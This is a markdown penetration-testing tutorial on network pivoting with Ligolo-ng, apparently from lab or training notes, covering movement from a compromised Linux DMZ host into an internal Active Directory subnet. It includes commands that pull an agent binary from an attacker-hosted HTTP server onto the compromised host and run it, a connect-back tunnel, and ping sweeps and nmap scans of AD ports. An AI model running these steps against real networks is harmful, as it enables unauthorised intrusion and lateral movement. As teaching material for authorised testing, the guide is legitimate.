# Network Pivoting & Discovery via Ligolo-ng
**Scenario:** Linux DMZ Compromise to Internal Active Directory Reconnaissance  
**Attacker IP (tun0):** `10.10.200.30`  
**DMZ Dual-Homed Pivot:** `192.168.80.10` / `192.168.95.15`  
**Target Subnet:** `192.168.98.0/24` (or internal transit `192.168.95.0/24`)

---

## 1. Why Ligolo-ng Over Proxychains?

* **Full Layer 3 TUN Interface:** Unlike Proxychains (which hooks dynamic library network calls via `LD_PRELOAD` and only supports TCP connect scans), Ligolo-ng establishes a virtual TUN adapter on your Kali host.
* **Native Tool Support:** SYN scans (`nmap -sS`), ICMP pings, UDP scans, and tools that ignore socks proxies work natively through standard routing table rules.
* **High Performance:** Operates over a multiplexed TLS connection, avoiding the overhead, thread lockups, and timeouts common with Proxychains and SOCKS proxies.

Ligolo-ng operates at Layer 3 using a virtual TUN interface rather than a SOCKS proxy. This eliminates the need for Proxychains and allows your tools to route traffic natively into the internal subnet.

---

## 2. Architecture Overview


``` text

[ Kali Machine ]                 [ Linux DMZ Pivot ]                [ Internal AD Network ]
10.10.200.30                     192.168.80.10 / 192.168.95.15       192.168.98.0/24
(Ligolo Proxy + TUN ligolo) <---> (Ligolo Agent)              -----> [ Target Hosts ]

```

---

## 3. Tool Acquisition & Setup

Download the latest compiled release binaries for both the proxy (Kali) and the agent (Pivot):

### 3.1 On Kali (Attacker Box)
```bash
# Create working directory
mkdir -p ~/tools/ligolo && cd ~/tools/ligolo

# Download Ligolo-ng proxy (Linux 64-bit)
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_linux_amd64.tar.gz
tar -zxvf ligolo-ng_proxy_linux_amd64.tar.gz

# Download Ligolo-ng agent for the pivot host
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_linux_amd64.tar.gz
tar -zxvf ligolo-ng_agent_linux_amd64.tar.gz

```

---

## 4. Establishing the Pivot Tunnel

### Step 1: Create the TUN Interface on Kali

A dedicated TUN interface must exist on your attacking machine to direct packets into the Ligolo tunnel.

```bash
# Create TUN interface named 'ligolo'
sudo ip tuntap add user $(whoami) mode tun ligolo

# Bring the interface UP
sudo ip link set ligolo up

# Verify interface state
ip addr show ligolo

```

### Step 2: Start the Ligolo-ng Proxy on Kali

Run the proxy listener. By default, it accepts incoming agent connections on port `11601`:

```bash
# Run proxy (self-cert generates an on-the-fly TLS cert)
./proxy -selfcert -laddr 0.0.0.0:11601

```

### Step 3: Transfer & Execute Agent on Compromised DMZ Host
Transfer the Linux agent binary to the pivot machine (192.168.80.10) via SSH/SCP and execute it, pointing back to your Kali IP:
Stage the agent binary from Kali to the DMZ Linux machine:

```bash
# On Kali: host the agent
python3 -m http.server 8000

# On DMZ Linux Host (via existing SSH/RCE shell):
cd /tmp
wget http://10.10.200.30:8000/agent -O agent
chmod +x agent

# Connect back to your Kali machine's Ligolo listener
./agent -connect 10.10.200.30:11601 -ignore-cert

# using scp 
scp ./agent user@192.168.80.10:/tmp/agent
ssh user@192.168.80.10 "chmod +x /tmp/agent && /tmp/agent -connect <KALI_IP>:11601 -ignore-cert"
```

---

## 5. Activating the Session & Configuring Routes

Once the agent connects back, an interactive prompt will notify you in your Kali `proxy` terminal.

### Step 1: Start the Session inside Ligolo Console

```text
ligolo-ng » session
? Select a session: 1 - 192.168.80.10 / 192.168.95.15
[Session 1] » start
[+] Starting tunnel to agent...

```

### Step 2: Add Kernel Routes on Kali

Open a separate terminal on Kali to instruct the Linux kernel to route traffic destined for internal ranges through the `ligolo` TUN interface:

```bash
# Route internal AD network through ligolo
sudo ip route del 192.168.98.0/24
sudo ip route add 192.168.98.0/24 dev ligolo

# (Optional) Route the DMZ internal interface range if adjacent
sudo ip route add 192.168.95.0/24 dev ligolo

# Verify the routing entry
ip route show 192.168.98.0/24
ip route show | grep ligolo

```

---

## 6. Host & Port Discovery

With the routing table configured, all network scanning utilities run natively from Kali without `proxychains`.

### 6.1 Fast Host Discovery

```bash
# Ping sweep / ICMP discovery
fping -a -g 192.168.98.0/24 2>/dev/null

# one liner bash command to check for Live hosts
for i in $(seq 1 254); do ping -c 1 -W 1 192.168.98.$i >/dev/null && echo "192.168.98.$i is UP"; done


# Nmap host discovery (TCP SYN ping + ACK ping across common AD ports)
nmap -sn -PS88,135,139,445,3389 192.168.98.0/24

```

### 6.2 Target Port Scanning

Once live hosts (e.g., `192.168.98.2`, `192.168.98.30`, `192.168.98.120`) are identified:

```bash
# Full TCP SYN scan against discovered internal Domain Controller / targets
sudo nmap -sS -Pn -n -T4 --top-ports 1000 192.168.98.0/24 -oN internal_discovery.txt

# Detailed enumeration of critical Active Directory ports
nmap -Pn -n -p 53,88,135,139,389,445,464,593,636,3268,3269,3389 -sC -sV 192.168.98.2 -oN parent_dc.txt

```

---

## 7. Operational Troubleshooting

| Symptom | Cause | Resolution |
| --- | --- | --- |
| `connection refused` on agent execution | Proxy not listening or wrong port. | Confirm `./proxy -selfcert -laddr 0.0.0.0:11601` is running on Kali. |
| Scan packets drop (`host unreachable`) | Route missing or tunnel not started. | Type `session` $\rightarrow$ choose session $\rightarrow$ type `start`. Verify `ip route` contains `192.168.98.0/24 dev ligolo`. |
| Agent connects but disconnects instantly | TLS validation failure. | Ensure `-ignore-cert` flag is supplied when executing the `./agent`. |
| Routing conflicts | Existing default gateway overlap. | Check `ip route` on Kali to ensure no overlapping higher-priority metric route exists for `192.168.98.0/24`. |
